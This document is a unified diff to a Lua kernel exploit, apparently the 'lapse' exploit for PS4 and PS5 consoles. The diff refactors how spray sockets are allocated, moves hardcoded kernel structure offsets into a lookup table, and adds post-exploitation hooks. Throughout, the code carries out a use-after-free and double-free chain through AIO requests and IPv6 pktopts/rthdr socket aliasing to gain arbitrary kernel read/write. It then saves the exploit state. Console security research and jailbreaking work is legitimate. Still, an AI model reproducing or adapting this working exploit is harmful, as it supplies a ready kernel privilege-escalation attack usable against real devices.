@@ -300,7 +300,8 @@ NUM_WORKERS = 2
 NUM_GROOMS = 0x200
 NUM_HANDLES = 0x100
 NUM_RACES = 100
-NUM_SDS = 64
+NUM_SDS = 60
+NUM_ALT_SDS = 60
 NUM_ALIAS = 100
 LEAK_LEN = 16
 NUM_LEAKS = 16
@@ -1245,7 +1246,7 @@ function make_aliased_pktopts(sds)
 end
 
 
-function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, fake_reqs3_addr)
+function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr)
     
     local max_leak_len = bit32.lshift(0xff + 1, 3)
     local buf = memory.alloc(max_leak_len)
@@ -1372,17 +1373,9 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, fake_reqs3_addr)
     memory.write_dword(target_ids, req_id)
     memory.write_dword(target_ids+4, target_id)
 
-    -- NOTE: we cant use existing `sds` because we dont know which one is reclaimed/dirty
-    local new_sds = {}
-    for i=1,48 do
-        table.insert(new_sds, new_socket())
-    end
-    
-    -- free_rthdrs(sds)
-
     -- double free on malloc 0x100 by:
     --   - freeing target_id's aio_object->reqs1
-    --   - freeing req_id's aio_object->aio_entry[x]->ar2_info
+    --   - freeing req_id's aio_object->aio_entries[x]->ar2_info
     --      - ar2_info points to same addr as target_id's aio_object->reqs1
 
     -- PANIC: double free on the 0x100 malloc zone. important kernel data may alias
@@ -1393,7 +1386,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, fake_reqs3_addr)
     
     -- RESTORE: double freed memory has been reclaimed with harmless data
     -- PANIC: 0x100 malloc zone pointers aliased
-    local sd_pair = make_aliased_pktopts(new_sds)
+    local sd_pair = make_aliased_pktopts(sds_alt)
 
     local err1 = memory.read_dword(sce_errs):tonumber()
     local err2 = memory.read_dword(sce_errs+4):tonumber()
@@ -1424,22 +1417,14 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, fake_reqs3_addr)
         error('failed to make aliased pktopts');
     end
 
-    -- close the new sockets
-    for i=1,#new_sds do
-        syscall.close(new_sds[i])
-    end
-
-    -- free_rthdrs(sds)
-
     return sd_pair, sd
-
 end
 
 
 -- k100_addr is double freed 0x100 malloc zone address
 -- dirty_sd is the socket whose rthdr pointer is corrupt
 -- kernel_addr is the address of the "evf cv" string
-function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio_info_addr)
+function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, sds_alt, aio_info_addr)
 
     local master_sock = pktopts_sds[1]
     local tclass = memory.alloc(4)
@@ -1458,19 +1443,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio
 
     syscall.close(pktopts_sds[2])
 
-    local new_sds = {}
-    for i=1,48 do
-        table.insert(new_sds, new_socket())
-    end
-
     for i=1, NUM_ALIAS do
 
-        for j=1, #new_sds do
+        for j=1, #sds_alt do
             -- if a socket doesn't have a pktopts, setting the rthdr will make one.
             -- the new pktopts might reuse the memory instead of the rthdr.
             -- make sure the sockets already have a pktopts before
             memory.write_dword(pktopts + off_tclass, bit32.bor(0x4141, bit32.lshift(j, 16)))
-            set_rthdr(new_sds[j], pktopts, rsize)
+            set_rthdr(sds_alt[j], pktopts, rsize)
         end
 
         gsockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
@@ -1478,8 +1458,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio
         if bit32.band(marker, 0xffff) == 0x4141 then
             printf("found reclaim sd at attempt: %d", i)
             local idx = bit32.rshift(marker, 16)
-            reclaim_sock = new_sds[idx]
-            table.remove(new_sds, idx)
+            reclaim_sock = sds_alt[idx]
+            table.remove(sds_alt, idx)
             break
         end
     end
@@ -1528,13 +1508,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio
 
     print("slow arbitrary kernel read achieved")
 
-    local OFFSET_P_PID = PLATFORM == "ps4" and 0xb0 or 0xbc
-    local OFFSET_P_FD = 0x48
-    local OFFSET_FDESCENTTBL_FDT_OFILES = PLATFORM == "ps4" and 0x0 or 0x8
-    local OFFSET_PCB = 0x18
-    local OFFSET_PKTOPTS = PLATFORM == "ps4" and 0x118 or 0x120
-    local OFILES_MULTIPLE = PLATFORM == "ps4" and 0x8 or 0x30
-
     -- we are assuming that previously freed aio_info still contains addr to curproc 
     local curproc = slow_kread8(aio_info_addr + 8)
 
@@ -1542,7 +1515,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio
         errorf("invalid curproc kernel address: %s", hex(curproc))
     end
 
-    local possible_pid = slow_kread8(curproc + OFFSET_P_PID)
+    local possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID)
     local current_pid = syscall.getpid()
 
     if possible_pid.l ~= current_pid.l then
@@ -1552,15 +1525,20 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio
     printf("curproc = %s", hex(curproc))
 
     kernel.addr.curproc = curproc
-    kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + OFFSET_P_FD) -- p_fd (filedesc)
-    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + OFFSET_FDESCENTTBL_FDT_OFILES
+    kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD) -- p_fd (filedesc)
+    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES
+    kernel.addr.inside_kdata = kernel_addr
+
+    local function get_fd_data_addr(sock, kread8_fn)
+        local filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES
+        local file_addr = kread8_fn(filedescent_addr + 0x0) -- fde_file
+        return kread8_fn(file_addr + 0x0) -- f_data
+    end
 
     local function get_sock_pktopts(sock, kread8_fn)
-        local filedescent_addr = kernel.addr.curproc_ofiles + sock * OFILES_MULTIPLE
-        local file_addr = kread8_fn(filedescent_addr + 0x0) -- fde_file
-        local fd_data = kread8_fn(file_addr + 0x0) -- f_data
-        local pcb = kread8_fn(fd_data + OFFSET_PCB)
-        local pktopts = kread8_fn(pcb + OFFSET_PKTOPTS)
+        local fd_data = get_fd_data_addr(sock, kread8_fn)
+        local pcb = kread8_fn(fd_data + kernel_offset.SO_PCB) 
+        local pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS)
         return pktopts
     end
 
@@ -1602,28 +1580,13 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio
     end
 
     memory.write_qword(read_buf, kread8(kernel_addr))
-    local kstr = memory.read_null_terminated_string(read_buf)
-    dbgf("*(&\"evf cv\"): %s", kstr)
 
+    local kstr = memory.read_null_terminated_string(read_buf)
     if kstr ~= "evf cv" then
         error("test read of &\"evf cv\" failed")
     end
 
     print("restricted kernel r/w achieved")
-
-    -- close the new sockets
-    for i=1,#new_sds do
-        syscall.close(new_sds[i])
-    end
-
-    --
-    -- below are specific for ps5
-    -- need to adapt structure offsets for ps4, etc
-    --
-
-    if PLATFORM == "ps4" then
-        error("ps4 not yet supported up to this point")
-    end
 
     -- `restricted_kwrite8` will overwrites other pktopts fields (up to 20 bytes), but that is fine
     ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8)
@@ -1634,9 +1597,12 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio
     dbg("test dump:")
     dbg(kernel.hex_dump(kernel_addr))
 
-    print("arbitrary kernel r/w achieved!")
+    local kstr = kernel.read_null_terminated_string(kernel_addr)
+    if kstr ~= "evf cv" then
+        error("test read of &\"evf cv\" failed")
+    end
 
-    ---------------------------------------------
+    print("arbitrary kernel r/w achieved!")
 
     -- RESTORE: clean corrupt pointers
     -- pktopts.ip6po_rthdr = NULL
@@ -1663,42 +1629,30 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, aio
 
     -- increase the ref counts to prevent deallocation
     for _, each in ipairs(sock_increase_ref) do
-        local sock_addr = get_fd_data_addr(each)
+        local sock_addr = get_fd_data_addr(each, kernel.read_qword)
         kernel.write_dword(sock_addr + 0x0, 0x100)  -- so_count
     end
 
     print("fixes applied")
 
-    dbg("kernel addr dump:")
-    dbg(dump_table(kernel.addr))
-
-    -- persist exploitation state
-    storage.set("kernel_rw", {
-        ipv6_kernel_rw_data = ipv6_kernel_rw.data,
-        kernel_addr = kernel.addr
-    })
-
-    print("exploit state is saved into storage")
 end
 
 
-function get_fd_data_addr(fd)
-    local filedescent_addr = kernel.addr.curproc_ofiles + fd * 0x30
-    local file_addr = kernel.read_qword(filedescent_addr + 0x0) -- fde_file
-    return kernel.read_qword(file_addr + 0x0) -- f_data
+function post_exploitation_ps4()
+
 end
+
+
+function post_exploitation_ps5()
+    
+end
+
 
 
 function print_info()
-
     print("lapse exploit\n")
     printf("running on %s %s", PLATFORM, FW_VERSION)
     printf("game @ %s\n", game_name)
-
-    dbgf("eboot base @ %s", hex(eboot_base))
-    dbgf("libc base @ %s", hex(libc_base))
-    dbgf("libkernel base @ %s\n", hex(libkernel_base))
-
 end
 
 
@@ -1718,6 +1672,7 @@ function kexploit()
 
     local sockpair = memory.alloc(8)
     local sds = {}
+    local sds_alt = {}
 
     if syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair):tonumber() == -1 then
         error("socketpair() error: " .. get_error_string())
@@ -1731,6 +1686,10 @@ function kexploit()
     -- NOTE: on game process, only < 130? sockets can be created, otherwise we'll hit limit error
     for i=1, NUM_SDS do
         table.insert(sds, new_socket())
+    end
+
+    for i=1, NUM_ALT_SDS do
+        table.insert(sds_alt, new_socket())
     end
 
     local block_id, groom_ids = nil, nil
@@ -1751,13 +1710,29 @@ function kexploit()
 
         print("\n[+] Double free SceKernelAioRWRequest\n")
         local pktopts_sds, dirty_sd
-            = double_free_reqs1(reqs1_addr, target_id, evf, sd_pair[1], sds, fake_reqs3_addr)
+            = double_free_reqs1(reqs1_addr, target_id, evf, sd_pair[1], sds, sds_alt, fake_reqs3_addr)
 
         syscall.close(fake_reqs3_sd)
             
         print('\n[+] Get arbitrary kernel read/write\n');
-        make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds, aio_info_addr)
+        make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr)
 
+        print('\n[+] Post exploitation\n');
+
+        if PLATFORM == "ps4" then
+            post_exploitation_ps4()
+        elseif PLATFORM == "ps5" then
+            post_exploitation_ps5()
+        end
+
+        -- persist exploitation state
+        storage.set("kernel_rw", {
+            ipv6_kernel_rw_data = ipv6_kernel_rw.data,
+            kernel_addr = kernel.addr
+        })
+
+        print("exploit state is saved into storage")
+        print("done!")
     end)
 
     if err then
@@ -1780,8 +1755,12 @@ function kexploit()
         aio_multi_delete(block_id, 1)
     end
 
-    for _, sd in ipairs(sds) do
-        syscall.close(sd)
+    for i=1, #sds do
+        syscall.close(sds[i])
+    end
+
+    for i=1, #sds_alt do
+        syscall.close(sds_alt[i])
     end
 
     print("restoring to previous core/rtprio")
